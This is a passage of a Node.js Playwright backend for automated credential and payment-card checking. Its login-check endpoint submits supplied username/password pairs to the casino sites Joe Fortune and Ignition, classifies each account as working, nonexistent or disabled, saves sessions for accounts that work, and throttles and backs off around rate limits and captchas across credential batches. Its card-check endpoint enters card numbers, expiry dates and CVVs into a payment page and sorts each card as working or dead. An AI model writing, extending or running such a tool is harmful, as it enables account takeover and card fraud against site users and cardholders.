 *     redirect to Cloudflare challenges or error pages on every bad login.
 *
 * @param {import('playwright').Page} page - The Playwright page after form submission.
 * @param {string} loginUrl - The original login URL.
 * @returns {Promise<{outcome: string, note: string}>}
 */
async function determineLoginOutcome(page, loginUrl) {
  const url = page.url().toLowerCase();
  const bodyText = (await page.textContent('body').catch(() => '')).toLowerCase();

  // ── Hard failure signals (check first) ──────────────────────────────────
  // Joe Fortune exact: "Your account has been disabled. Please, contact Customer Service."
  // This is the ONLY signal that indicates permanent disable — red textbox below login form.
  if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(bodyText)) {
    return { outcome: 'permDisabled', note: 'Joe Fortune — account permanently disabled (contact Customer Service)' };
  }
  // Joe Fortune exact: "Sorry, your account has been temporarily disabled due to
  // too many failed login attempts. Contact us immediately to re-enable."
  if (/temporarily disabled due to too many failed login attempt/i.test(bodyText)) {
    return { outcome: 'tempDisabled', note: 'Joe Fortune — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.' };
  }
  // Joe Fortune exact — attempt 1 wrong password:
  // "Oops! Your email and/or password are incorrect. Please check that your CAPS lock is not on and try again."
  if (/oops!\s*your email and\/or password are incorrect\.\s*please check that your caps lock/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Joe Fortune — incorrect email/password (attempt 1)' };
  }
  // Joe Fortune exact — attempt 2+ wrong password (warning about blocking):
  // "Your email and/or password remain incorrect. Further failed attempts may result in your account being blocked."
  if (/your email and\/or password remain incorrect\.\s*further failed attempts may result/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Joe Fortune — email/password remain incorrect (account does not exist or wrong credentials)' };
  }
  if (/email.*not.*found|account.*not.*found|user.*not.*found|no account.*found/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'No account found for this email' };
  }
  if (/invalid.*password|incorrect.*password|wrong.*password|password.*incorrect/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Invalid password' };
  }
  if (/invalid.*credential|incorrect.*credential|login.*failed|sign.?in.*failed/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Invalid credentials' };
  }
  if (/your account.*banned|account.*banned|banned.*account/i.test(bodyText)) {
    return { outcome: 'permDisabled', note: 'Account banned' };
  }

  // ── Joe Fortune: specific success signals ───────────────────────────────
  // Signal 1: green "Welcome!" banner with checkmark shown immediately after login
  if (/^\s*welcome\s*!?\s*$/im.test(bodyText) || /✓.*welcome|welcome.*✓/i.test(bodyText)) {
    return { outcome: 'working', note: 'Joe Fortune — Welcome! banner detected (login successful)' };
  }
  // Signal 2: redirected to lobby — nav shows "JOE FORTUNE" + DEPOSIT button + account icon
  // Detected by URL leaving /login and body containing "deposit" without login-page content
  const urlPath = (() => { try { return new URL(page.url()).pathname.toLowerCase(); } catch { return ''; } })();
  const isOffLoginPage = !url.includes('/login')
    && !url.includes('/sign-in')
    && !url.includes('/signin')
    && !url.includes('overlay=login')
    && !url.includes('modal=login')
    && !url.includes('action=login');
  if (isOffLoginPage && /hot pokies|new & exclusive|live casino|specialty games/i.test(bodyText)) {
    return { outcome: 'working', note: 'Joe Fortune — casino lobby detected (login successful)' };
  }
  if (isOffLoginPage && /deposit/i.test(bodyText) && /joe fortune/i.test(bodyText) && /welcome back/i.test(bodyText)) {
    return { outcome: 'working', note: 'Joe Fortune — Welcome Back screen detected (login successful)' };
  }

  // ── General strong success signals ──────────────────────────────────────
  const urlIndicatesSuccess = ['/account', '/dashboard', '/cashier', '/lobby', '/deposit', '/withdraw', '/profile', '/my-account', '/game', '/casino'].some(p => urlPath.startsWith(p));
  const strongSuccessPatterns = [
    /welcome back/i, /account balance/i, /your balance/i, /\$[\d,]+\.\d{2}/,
    /make a deposit/i, /account overview/i,
    /logout/i, /log out/i, /sign out/i, /withdrawal/i,
  ];
  const hasStrongSuccessText = strongSuccessPatterns.some(p => p.test(bodyText));
  const softSuccessPatterns = [/hot pokies/i, /live casino/i, /lobby/i, /balance/i];
  const hasSoftSuccessText = softSuccessPatterns.some(p => p.test(bodyText));

  if (hasStrongSuccessText && isOffLoginPage) {
    return { outcome: 'working', note: 'Login successful — account area detected' };
  }
  if (urlIndicatesSuccess && hasSoftSuccessText) {
    return { outcome: 'working', note: `Login successful — redirected to ${urlPath}` };
  }

  // ── Catch-all failure signals ────────────────────────────────────────────
  if (/cloudflare|captcha|bot.*detected|access denied|403 forbidden|429 too many/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Bot/Cloudflare challenge — unable to verify' };
  }
  if (/error|invalid|incorrect|failed/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Login failed — check screenshots for details' };
  }

  return { outcome: 'noAcc', note: 'Login result unclear — review screenshots' };
}

/**
 * Attempts to fill a card payment form on a page by trying common credit card
 * field selectors. Returns true if the card number field was found and filled.
 * @param {import('playwright').Page} page - The Playwright page.
 * @param {string} number - Card number.
 * @param {string} mm - Expiry month (2 digits).
 * @param {string} yy - Expiry year (2 digits).
 * @param {string} cvv - CVV/CVC code.
 * @returns {Promise<boolean>} True if the card number field was located and filled.
 */
async function fillCardForm(page, number, mm, yy, cvv) {
  const cardNumSelectors = [
    'input[name*="card" i][name*="number" i]',
    'input[id*="card" i][id*="number" i]',
    'input[placeholder*="card number" i]',
    'input[placeholder*="card no" i]',
    'input[data-testid*="card" i]',
    'input[autocomplete="cc-number"]',
    'input[name="cardNumber"]',
    'input[name="card_number"]',
    'input[name="number"]',
  ];
  const expirySelectors = [
    'input[autocomplete="cc-exp"]',
    'input[name*="expiry" i]',
    'input[name*="expiration" i]',
    'input[placeholder*="MM/YY" i]',
    'input[placeholder*="expiry" i]',
  ];
  const cvvSelectors = [
    'input[autocomplete="cc-csc"]',
    'input[name*="cvv" i]',
    'input[name*="cvc" i]',
    'input[name*="csc" i]',
    'input[placeholder*="cvv" i]',
    'input[placeholder*="cvc" i]',
    'input[placeholder*="security code" i]',
  ];

  let cardFilled = false;
  for (const sel of cardNumSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(number);
        cardFilled = true;
        break;
      }
    } catch {}
  }

  // Try combined expiry field (MM/YY)
  for (const sel of expirySelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(`${mm}/${yy}`);
        break;
      }
    } catch {}
  }

  // Try separate month/year fields
  try {
    const mmEl = page.locator('select[name*="month" i], input[name*="month" i]').first();
    if (await mmEl.count() > 0) await mmEl.fill(mm);
    const yyEl = page.locator('select[name*="year" i], input[name*="year" i]').first();
    if (await yyEl.count() > 0) await yyEl.fill(`20${yy}`);
  } catch {}

  for (const sel of cvvSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(cvv);
        break;
      }
    } catch {}
  }

  return cardFilled;
}

/**
 * Analyses page content after a card check to determine the result.
 * @param {import('playwright').Page} page - The Playwright page after submission.
 * @returns {Promise<{outcome: string, note: string}>} Outcome and note.
 */
async function determineCardOutcome(page) {
  const bodyText = (await page.textContent('body').catch(() => '')).toLowerCase();

  if (/declined|do not honor|insufficient funds|card.*not.*accepted|payment.*failed/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Card declined by payment processor' };
  }
  if (/approved|success|payment.*complete|transaction.*approved|authorised/i.test(bodyText)) {
    return { outcome: 'working', note: 'Card approved' };
  }
  if (/invalid.*card|card.*invalid|card.*number.*invalid/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Invalid card number' };
  }
  if (/expired/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Card expired' };
  }
  if (/(payment|card|transaction|processor).{0,30}error|error.{0,30}(payment|card|transaction|processing)/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Error during card check' };
  }

  return { outcome: 'dead', note: 'No clear result — check screenshots' };
}

// ── API: Status ──────────────────────────────────────────────────────────────

/**
 * GET /api/status
 * Returns server health status so the webapp can detect if the automation
 * backend is available before starting a run.
 */
app.get('/api/status', (req, res) => {
  res.json({
    ok: true,
    version: '1.3.0',
    mode: 'live',
    features: {
      sse: true,
      diskScreenshots: true,
      runCancellation: true,
      browserPool: true,
      sessionReuse: true,
      smartThrottle: true,
      networkHooks: true,
      jsonlLogging: true,
    },
    activeRuns:  runRegistry.size,
    sseClients:  sseClients.size,
    browserPool: {
      headless: !!browserPool.headless,
      headed:   !!browserPool.headed,
    },
  });
});

// ── API: Login Check ─────────────────────────────────────────────────────────

/** Maximum number of login attempts before declaring noAcc. */
const MAX_LOGIN_ATTEMPTS = 4;

/** Maximum time to poll for a login response before giving up (ms). */
const RESPONSE_POLL_MS = 15000;

/** Poll interval while waiting for a response (ms). */
const POLL_INTERVAL_MS = 300;

/**
 * Response type codes returned by waitForLoginResponse.
 * @readonly
 * @enum {string}
 */
const RESP = {
  SUCCESS:       'success',
  PERM_DISABLED: 'permDisabled',
  TEMP_DISABLED: 'tempDisabled',
  WRONG_PASS_1:  'wrongPass1',   // "Oops! Your email and/or password are incorrect"
  WRONG_PASS_2:  'wrongPass2',   // "Your email and/or password remain incorrect"
  UNKNOWN:       'unknown',      // timed out with no recognised pattern
};

/**
 * Polls the page body every POLL_INTERVAL_MS for up to maxWaitMs to detect
 * a known login response. Returns a RESP code as soon as one is found, or
 * RESP.UNKNOWN if the timeout expires with no match.
 *
 * Checking this way (rather than a fixed wait) means we react the moment
 * Joe Fortune renders a result rather than always waiting the full delay.
 *
 * @param {import('playwright').Page} page
 * @param {number} [maxWaitMs=5000]
 * @returns {Promise<string>} One of the RESP constants.
 */
async function waitForLoginResponse(page, maxWaitMs = RESPONSE_POLL_MS, site = 'joe') {
  const deadline = Date.now() + maxWaitMs;
  while (Date.now() < deadline) {
    const body = (await page.textContent('body').catch(() => '')).toLowerCase();
    const url  = (page.url() || '').toLowerCase();

    // ── Disabled (check before success — these appear on the login page) ──
    if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(body)) return RESP.PERM_DISABLED;
    if (/temporarily disabled due to too many failed login attempt/i.test(body)) return RESP.TEMP_DISABLED;

    // ── Wrong password signals (also appear on the login page) ────────────
    if (/your email and\/or password remain incorrect.*further failed attempt/i.test(body)) return RESP.WRONG_PASS_2;
    if (/oops.*your email and\/or password are incorrect.*caps lock/i.test(body)) return RESP.WRONG_PASS_1;

    // Ignition-specific wrong-password text
    if (site === 'ign') {
      if (/incorrect (email|username|password)|invalid (email|username|password|credentials)/i.test(body)) return RESP.WRONG_PASS_1;
    }

    // ── Success: URL must have left the login page AND auth-only signals ──
    const isOffLoginPage = !url.includes('/login')
      && !url.includes('/sign-in')
      && !url.includes('/signin')
      && !url.includes('overlay=login')
      && !url.includes('modal=login')
      && !url.includes('action=login');

    if (isOffLoginPage && (await isLoggedIn(page, site))) return RESP.SUCCESS;

    await page.waitForTimeout(POLL_INTERVAL_MS);
  }
  return RESP.UNKNOWN;
}

/**
 * Site-aware logged-in check. Uses DOM/cookie signals that only exist for
 * authenticated users — NOT promotional marketing text which appears on the
 * logged-out homepage too.
 *
 * @param {import('playwright').Page} page
 * @param {string} site - 'joe' | 'ign'
 * @returns {Promise<boolean>}
 */
async function isLoggedIn(page, site) {
  try {
    // 1. Auth-only DOM elements — logout button / profile menu / balance chip.
    //    These are absent when logged out.
    const authOnlyLocators = site === 'ign'
      ? [
          'a:has-text("Log Out")', 'a:has-text("Log out")', 'a:has-text("Logout")',
          'button:has-text("Log Out")', 'button:has-text("Logout")',
          '[data-testid*="logout" i]',
          '[class*="user-menu"]', '[class*="account-menu"]',
          '[class*="balance"]', '[data-testid*="balance" i]',
          'a[href*="/cashier"]', 'a[href*="/account"]:has-text("Account")',
          'button:has-text("Deposit")',
        ]
      : [
          // Joe Fortune: logout link, balance, user avatar, deposit button
          'a:has-text("Logout")', 'a:has-text("Log Out")', 'a:has-text("Sign Out")',
          'button:has-text("Logout")', 'button:has-text("Deposit")',
          '[class*="user-avatar"]', '[class*="profile-avatar"]',
          '[class*="balance"]', '[data-testid*="balance" i]',
          'a[href*="/account"]', 'a[href*="/cashier"]',
        ];

    for (const sel of authOnlyLocators) {
      const el = page.locator(sel).first();
      if ((await el.count().catch(() => 0)) > 0 && (await el.isVisible({ timeout: 150 }).catch(() => false))) {
        return true;
      }
    }

    // 2. Auth cookies — casino sites typically set a session/auth cookie on
    //    successful login. Presence of a cookie whose name matches typical
    //    auth patterns is a strong secondary signal.
    const cookies = await page.context().cookies().catch(() => []);
    const authCookie = cookies.find(c => /token|auth|session|jwt|sid|bearer/i.test(c.name) && c.value && c.value.length > 10);
    if (authCookie) {
      // Cookie alone isn't enough (some sites set session cookies pre-login).
      // Combine with "no visible password input" — if the login form is gone
      // AND we have an auth-shaped cookie, treat as logged in.
      const passVisible = await page.locator('input[type="password"]:visible').first().isVisible({ timeout: 150 }).catch(() => false);
      if (!passVisible) return true;
    }
  } catch { /* ignore */ }
  return false;
}

/**
 * POST /api/login-check
 * Performs a real Playwright login attempt against the target casino site.
 *
 * Flow (single page — NO navigation between submits):
 *  1. Navigate to login page ONCE, dismiss cookies, fill credentials → SCR 1/4
 *  2. Submit #1, poll for known response → SCR 2/4 (same page)
 *  3. If wrong-password: re-fill same fields + submit #2 → SCR 3/4 (same page)
 *  4. 2000ms settle, read final DOM/URL in place → SCR 4/4 (same page)
 *  5. Session end: clear cookies + localStorage + sessionStorage, close browser
 *
 * Cookies / localStorage / JS state are preserved across all submits so the
 * screenshots form a clean visual timeline of the same page reacting to each
 * request. Only at session end is state wiped.
 *
 * Request body:
 *   site       {string} 'joe' | 'ign'
 *   username   {string}
 *   password   {string}
 *   loginUrl   {string}
 *   timeout    {number} optional page timeout ms
 *
 * Response: { outcome, note, shots: [4 base64 PNGs] }
 */
app.post('/api/login-check', async (req, res) => {
  const {
    site, username, password, loginUrl,
    timeout = NAV_TIMEOUT,
    liveView = false,
    reuseSession = false, // Tier-3 #11 — opt-in session persistence
  } = req.body;
  if (!username || !password || !loginUrl) {
    return res.status(400).json({ error: 'Missing username, password, or loginUrl' });
  }

  // Register the run FIRST (outside the pool) so the client can immediately
  // see it and cancel it. Actual work fans out across the context pool and
  // respects POOL_MAX_HEADLESS for the headless mode.
  const runHandle = startRun({ site, username, loginUrl, kind: 'login' });

  // Domain-aware throttling: respect cooldowns / backoff before starting.
  await applyDomainThrottle(loginUrl);

  let lease = null;
  let destroyContext = false;
  let context;
  const shotUrls = ['', '', '', ''];
  const htmlUrls = ['', '', '', ''];
  let outcome = 'noAcc';
  let note = 'Check did not complete';
  let netSnap = null;
  const host = _hostOf(loginUrl);
  const signal = runHandle.controller.signal;

  /** Persist a shot + HTML pair into slot i. Returns nothing — the arrays are populated. */
  const persist = async (buf, i, page) => {
    const [shotMeta, htmlMeta] = await Promise.all([
      persistShotBuffer(buf, runHandle.runId, i + 1),
      persistRunHtml(page, runHandle.runId, i + 1),
    ]);
    shotUrls[i] = shotMeta.url;
    htmlUrls[i] = htmlMeta.url;
  };

  try {
    // Session reuse + storageState requires a dedicated context, so it bypasses
    // the reuse path. Everything else leases from the pool and is returned on
    // completion — keeps 8-16 contexts warm across a 50-cred batch.
    const storageState = reuseSession ? await loadStorageState(site, username) : undefined;
    const needsFreshState = !!storageState;
    lease = await leaseContext({ live: !!liveView, needsFreshState, signal });
    context = lease.context;
    if (storageState) {
      try { await context.addCookies(storageState.cookies || []); } catch {}
    }
    runHandle.context = context;
    const page = await context.newPage();
    runHandle.page = page;
    page.setDefaultTimeout(timeout);

    // Attach live network hooks — any 429 / captcha / auth-JSON is tracked and
    // becomes a secondary signal for the outcome check below.
    netSnap = attachNetworkHooks(page);

    /** Helper — bail out early if client cancelled this runId. */
    const bail = () => { if (signal.aborted) throw new Error('run cancelled'); };

    // Navigation freeze: when `frozen` flips true, any further top-level
    // document navigation (e.g. Ignition's post-login redirect to the lobby)
    // is aborted so SCR 4/4 captures the response on the original page.
    // XHR/fetch and sub-resources are unaffected.
    let frozen = false;
    await page.route('**/*', (route) => {
      try {
        const req = route.request();
        if (frozen
            && req.resourceType() === 'document'
            && req.isNavigationRequest()
            && req.frame() === page.mainFrame()) {
          return route.abort();
        }
      } catch { /* fall through */ }
      return route.continue();
    });

    // ── Step 1: Load login page ───────────────────────────────────────────
    // Bulletproofing: if navigation fails (cert, DNS, timeout) we still want
    // to return a screenshot of the error state so the user has visual proof
    // rather than 4 blank slots.
    bail();
    try {
      await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout });
    } catch (navErr) {
      note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
      const buf = await captureShotBuf(page, 'SCR 1/4').catch(() => null);
      await persist(buf, 0, page);
      await persist(buf, 1, page); await persist(buf, 2, page); await persist(buf, 3, page);
      logEvent('warn', 'login.nav.failed', { runId: runHandle.runId, site, username, error: navErr.message });
      destroyContext = true;
      return res.json({
        runId: runHandle.runId,
        outcome: 'noAcc', note,
        shotUrls, htmlUrls,
      });
    }
    // ── Step 1: Confirm page is ready ────────────────────────────────────
    // Ignition paints its login overlay slower than Joe. For Joe, we also
    // probe for "WELCOME BACK!" as a ready signal rather than waiting blind.
    const initialLoadWait = site === 'ign' ? 6000 : 2000;
    await page.waitForTimeout(initialLoadWait);
    if (site === 'joe') {
      // Best-effort ready probe — non-fatal, just helps stabilise slow renders.
      await page.waitForFunction(
        () => /welcome back/i.test(document.body.innerText || ''),
        null, { timeout: 4000 }
      ).catch(() => {});
    }

    // ── Step 2: Dismiss cookie banner (Accept All / Got It / I Agree) ───
    await dismissCookiePopup(page);

    // ── Steps 3-4: Fill email + password ────────────────────────────────
    const filled = await fillLoginForm(page, username, password);
    if (!filled) note = 'Could not locate login form fields on page';

    let respType = RESP.UNKNOWN;
    const siteName = site === 'ign' ? 'Ignition' : 'Joe Fortune';

    /** Apply outcome from a polled respType — no-op for UNKNOWN / WRONG_PASS_1. */
    const applyRespOutcome = (rt, attemptLabel) => {
      if (rt === RESP.SUCCESS) {
        outcome = 'working';
        note = `${siteName} — login successful (${attemptLabel})`;
      } else if (rt === RESP.PERM_DISABLED) {
        outcome = 'permDisabled';
        note = `${siteName} — account permanently disabled (contact Customer Service)`;
      } else if (rt === RESP.TEMP_DISABLED) {
        outcome = 'tempDisabled';
        note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
      } else if (rt === RESP.WRONG_PASS_2) {
        outcome = 'noAcc';
        note = `${siteName} — incorrect credentials, further attempts may block account (${attemptLabel})`;
      }
    };

    /** Terminal outcomes never warrant another submit click. */
    const hasTerminalOutcome = () =>
      outcome === 'working' || outcome === 'permDisabled' || outcome === 'tempDisabled';

    /** True while we're still on a login URL (no off-page redirect yet). */
    const stillOnLoginPage = () => {
      try {
        const u = (page.url() || '').toLowerCase();
        return u.includes('/login') || u.includes('/sign-in') || u.includes('/signin')
          || u.includes('overlay=login') || u.includes('modal=login') || u.includes('action=login');
      } catch { return false; }
    };

    // ── Step 5: First submit ────────────────────────────────────────────
    const clicked1 = await clickSubmit(page);
    if (!clicked1) await page.keyboard.press('Enter');

    // ── Step 6: Wait 1500ms → SCR 1/4 (01_after_login_click) ───────────
    await page.waitForTimeout(1500);
    await dismissCookiePopup(page);
    bail();
    await persist(await captureShotBuf(page, 'SCR 1/4'), 0, page);
    respType = await waitForLoginResponse(page, RESPONSE_POLL_MS, site);
    applyRespOutcome(respType, 'attempt 1');

    // ── Step 7: Conditional 2nd submit (resilience re-click) ────────────
    // Only re-click if the first attempt didn't resolve AND we're still on
    // the login page. Skip on WRONG_PASS_2 so we don't risk blocking the
    // account with an unnecessary retry.
    let attempt2Fired = false;
    if (!hasTerminalOutcome() && respType !== RESP.WRONG_PASS_2 && stillOnLoginPage()) {
      await fillLoginForm(page, username, password);
      const clicked2 = await clickSubmit(page);
      if (!clicked2) await page.keyboard.press('Enter');
      attempt2Fired = true;
    }

    // ── Step 8: Wait 1450ms → SCR 2/4 (02_after_retry_click) ───────────
    await page.waitForTimeout(1450);
    await dismissCookiePopup(page);
    bail();
    await persist(await captureShotBuf(page, 'SCR 2/4'), 1, page);
    if (attempt2Fired) {
      respType = await waitForLoginResponse(page, RESPONSE_POLL_MS, site);
      applyRespOutcome(respType, 'attempt 2');
    }

    // ── Step 9: Conditional 3rd submit (final re-click) ────────────────
    // Same gating: skip on terminal outcome, WRONG_PASS_2, or if we've
    // already navigated off the login URL (success redirect).
    let attempt3Fired = false;
    if (!hasTerminalOutcome() && respType !== RESP.WRONG_PASS_2 && stillOnLoginPage()) {
      await fillLoginForm(page, username, password);
      const clicked3 = await clickSubmit(page);
      if (!clicked3) await page.keyboard.press('Enter');
      attempt3Fired = true;
    }

    // ── Step 10: Wait 1450ms → SCR 3/4 (03_final_click) ────────────────
    await page.waitForTimeout(1450);
    await dismissCookiePopup(page);
    bail();
    await persist(await captureShotBuf(page, 'SCR 3/4'), 2, page);
    if (attempt3Fired) {
      respType = await waitForLoginResponse(page, RESPONSE_POLL_MS, site);
      applyRespOutcome(respType, 'attempt 3');
    }

    // ── Steps 11-12: Confirm login success → SCR 4/4 ─────────────────────
    // Wait for the post-login page to settle, then read the final state for
    // any outcome still ambiguous after the three submit attempts. DO NOT
    // navigate away — we preserve the exact post-submit state so SCR 1–4
    // form a coherent visual timeline on a single URL.
    const needsFallback = outcome !== 'working' && outcome !== 'permDisabled' && outcome !== 'tempDisabled';

    // Freeze page navigation so any post-submit redirect (e.g. lobby jump
    // on successful login) doesn't pull us off the response page before we
    // capture SCR 4/4. Also block client-side reloads via JS.
    frozen = true;
    await page.evaluate(() => {
      try {
        window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; }, true);
        const noop = () => {};
        try { window.location.assign  = noop; } catch {}
        try { window.location.replace = noop; } catch {}
        try { window.location.reload  = noop; } catch {}
      } catch { /* ignore */ }
    }).catch(() => {});

    // Prefer networkidle over a blind wait so SCR 4/4 captures a fully-loaded
    // post-login page (lobby, dashboard, etc.). 2000ms settle as fallback.
    await page.waitForLoadState('networkidle', { timeout: 5000 }).catch(() => {});
    await page.waitForTimeout(2000).catch(() => {}); // settle before SCR 4/4
    await dismissCookiePopup(page);

    if (needsFallback) {
      const finalUrl  = (page.url() || '').toLowerCase();
      const finalBody = ((await page.textContent('body').catch(() => '')) || '').toLowerCase();

      // URL-based success: moved off the login page via normal site nav
      const offLoginPage = !finalUrl.includes('/login')
        && !finalUrl.includes('/sign-in')
        && !finalUrl.includes('/signin')
        && !finalUrl.includes('overlay=login')
        && !finalUrl.includes('modal=login')
        && !finalUrl.includes('action=login');

      // Site-aware auth-only check (DOM locators + auth cookie + no password input).
      // Avoids false positives from generic marketing text on logged-out homepages
      // (e.g. Ignition's `?overlay=login` landing page).
      const loggedIn = await isLoggedIn(page, site);

      if (offLoginPage && loggedIn) {
        outcome = 'working';
        note = `${siteName} — auth-only signals detected on current page (no navigation)`;
      } else if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(finalBody)) {
        outcome = 'permDisabled';
        note = `${siteName} — account permanently disabled (detected on final state)`;
      } else if (/temporarily disabled due to too many failed login attempt/i.test(finalBody)) {
        outcome = 'tempDisabled';
        note = `${siteName} — temporarily disabled (detected on final state)`;
      } else {
        outcome = 'noAcc';
        note = `${siteName} — no success signal detected after retries`;
      }
    }

    await persist(await captureShotBuf(page, 'SCR 4/4'), 3, page);

    // ── Network-hook tie-breaker (Swarm Upgrade v1 — promoted) ───────────
    // Network auth JSON is now treated as equal-priority with DOM signals for
    // the ambiguous 'noAcc' outcome only. Explicit DOM disabled signals
    // ('permDisabled' / 'tempDisabled') always beat the network hook — the
    // site's own copy is the ground truth for disabled accounts.
    // A 2xx auth response containing balance/userId/token promotes noAcc → working.
    // A 4xx auth JSON with error/invalid demotes a DOM-only 'working' → 'noAcc'.
    // 429/captcha → bump domain backoff for future runs.
    if (netSnap) {
      if (netSnap.saw429 || netSnap.sawCaptcha) {
        bumpDomainBackoff(host);
        note += ' (rate-limited / captcha observed)';
      }
      if (outcome === 'noAcc' && netSnap.authSuccess && !netSnap.authFailure) {
        outcome = 'working';
        note = `${site === 'ign' ? 'Ignition' : 'Joe Fortune'} — success confirmed by network auth response`;
      }
      if (outcome === 'working' && netSnap.authFailure && !netSnap.authSuccess) {
        outcome = 'noAcc';
        note = `${site === 'ign' ? 'Ignition' : 'Joe Fortune'} — network returned auth failure JSON; DOM may be stale`;
      }
      if (outcome === 'working') resetDomainBackoff(host);
    }

    // ── Session persistence: save storageState only on confirmed success ──
    if (outcome === 'working') {
      await saveStorageState(context, site, username);
    } else if (outcome === 'permDisabled') {
      await clearStoredSession(site, username);
    }

    // ── Session end: clear cookies + storage for hygiene, THEN close ──────
    // Only at the very end of the session — never between submits.
    await context.clearCookies().catch(() => {});
    await page.evaluate(() => {
      try { localStorage.clear(); sessionStorage.clear(); } catch { /* ignore */ }
    }).catch(() => {});

  } catch (err) {
    if (signal.aborted) {
      note = 'Run cancelled by client';
      outcome = 'cancelled';
    } else {
      note = `Automation error: ${err.message}`;
      outcome = 'noAcc';
    }
    destroyContext = true;
    logEvent('error', 'login.error', { runId: runHandle.runId, site, username, error: err.message });
  } finally {
    // Return context to pool (or destroy on fresh-state / cancellation / error).
    if (lease) await releaseContext(lease, { destroy: destroyContext });
    endRun(runHandle, { outcome, site, username });
  }

  broadcast('login.result', {
    runId: runHandle.runId, site, username, outcome, note,
    shotUrls, htmlUrls,
  });

  if (!res.headersSent) res.json({
    runId: runHandle.runId,
    outcome, note,
    shotUrls,     // stable disk-served URLs (Swarm Upgrade v1: base64 dropped)
    htmlUrls,     // raw HTML snapshots (one per shot slot)
    network:  netSnap ? {
      saw429: netSnap.saw429,
      sawCaptcha: netSnap.sawCaptcha,
      authSuccess: netSnap.authSuccess,
      authFailure: netSnap.authFailure,
      statusCodes: [...netSnap.statusCodes],
    } : null,
  });
});

// ── API: Card Check ───────────────────────────────────────────────────────────

/**
 * POST /api/card-check
 * Performs a real Playwright card check against the configured PPSR/payment URL.
 * Takes 4 real browser screenshots at key moments.
 *
 * Request body:
 *   number     {string} card number digits
 *   mm         {string} expiry month (2-digit)
 *   yy         {string} expiry year (2-digit)
 *   cvv        {string} CVV/CVC code
 *   ppsrUrl    {string} URL of the card check page
 *   timeout    {number} optional page timeout ms (default 30000)
 *
 * Response:
 *   outcome    {string} 'working' | 'dead'
 *   note       {string} human-readable result description
 *   shots      {string[]} array of 4 base64 PNG data URLs
 *     [0] page loaded, form visible
 *     [1] form filled with card details
 *     [2] first response after submit
 *     [3] final result state
 */
app.post('/api/card-check', async (req, res) => {
  const { number, mm, yy, cvv, ppsrUrl, timeout = NAV_TIMEOUT } = req.body;
  if (!number || !mm || !yy || !cvv || !ppsrUrl) {
    return res.status(400).json({ error: 'Missing card fields or ppsrUrl' });
  }

  const runHandle = startRun({ kind: 'card', last4: String(number).slice(-4), ppsrUrl });
  await applyDomainThrottle(ppsrUrl);

  let lease = null;
  let destroyContext = false;
  let context;
  const shotUrls = ['', '', '', ''];
  const htmlUrls = ['', '', '', ''];
  let outcome = 'dead';
  let note = 'Check did not complete';
  let netSnap = null;
  const host = _hostOf(ppsrUrl);
  const signal = runHandle.controller.signal;
  const bail = () => { if (signal.aborted) throw new Error('run cancelled'); };

  const persist = async (buf, i, page) => {
    const [shotMeta, htmlMeta] = await Promise.all([
      persistShotBuffer(buf, runHandle.runId, i + 1),
      persistRunHtml(page, runHandle.runId, i + 1),
    ]);
    shotUrls[i] = shotMeta.url;
    htmlUrls[i] = htmlMeta.url;
  };

  try {
    // Lease a context from the headless pool — concurrent card checks fan out
    // up to POOL_MAX_HEADLESS. No live-view mode for card checks.
    lease = await leaseContext({ live: false, signal });
    context = lease.context;
    runHandle.context = context;
    const page = await context.newPage();
    runHandle.page = page;
    page.setDefaultTimeout(timeout);
    netSnap = attachNetworkHooks(page);

    // Navigate to check page — if it fails, capture whatever the page shows
    // so the user has visual evidence of the failure mode.
    bail();
    try {
      await page.goto(ppsrUrl, { waitUntil: 'domcontentloaded', timeout });
    } catch (navErr) {
      note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
      const buf = await captureShotBuf(page, 'SCR 1/4').catch(() => null);
      await persist(buf, 0, page);
      await persist(buf, 1, page); await persist(buf, 2, page); await persist(buf, 3, page);
      logEvent('warn', 'card.nav.failed', { runId: runHandle.runId, error: navErr.message });
      destroyContext = true;
      return res.json({ runId: runHandle.runId, outcome: 'dead', note, shotUrls, htmlUrls });
    }
    await page.waitForTimeout(2000);
    await dismissCookiePopup(page);

    // Shot 1: page loaded, form visible
    bail();
    await persist(await captureShotBuf(page, 'SCR 1/4'), 0, page);

    // Fill card form
    const filled = await fillCardForm(page, number, mm, yy, cvv);
    if (!filled) {
      note = 'Could not find card number field on page';
    }

    // Shot 2: form filled with card details
    await persist(await captureShotBuf(page, 'SCR 2/4'), 1, page);

    // Submit
    const clicked = await clickSubmit(page);
    if (!clicked) {
      await page.keyboard.press('Enter');
    }

    // Wait for response
    await page.waitForTimeout(2000);
    try {
      await page.waitForLoadState('networkidle', { timeout: POST_SUBMIT_WAIT });
    } catch {}
    await page.waitForTimeout(1000);
    await dismissCookiePopup(page);

    // Shot 3: first response after submit
    bail();
    await persist(await captureShotBuf(page, 'SCR 3/4'), 2, page);

    // Determine outcome from DOM signals
    const result = await determineCardOutcome(page);
    outcome = result.outcome;
    note = result.note;

    // ── Network-hook tie-breaker for card-check ──────────────────────────
    // Card flows frequently return JSON 4xx with decline/invalid-card strings.
    // Use network responses as a tie-breaker against the DOM heuristic.
    if (netSnap) {
      if (netSnap.saw429 || netSnap.sawCaptcha) {
        bumpDomainBackoff(host);
        note += ' (rate-limited / captcha observed)';
      }
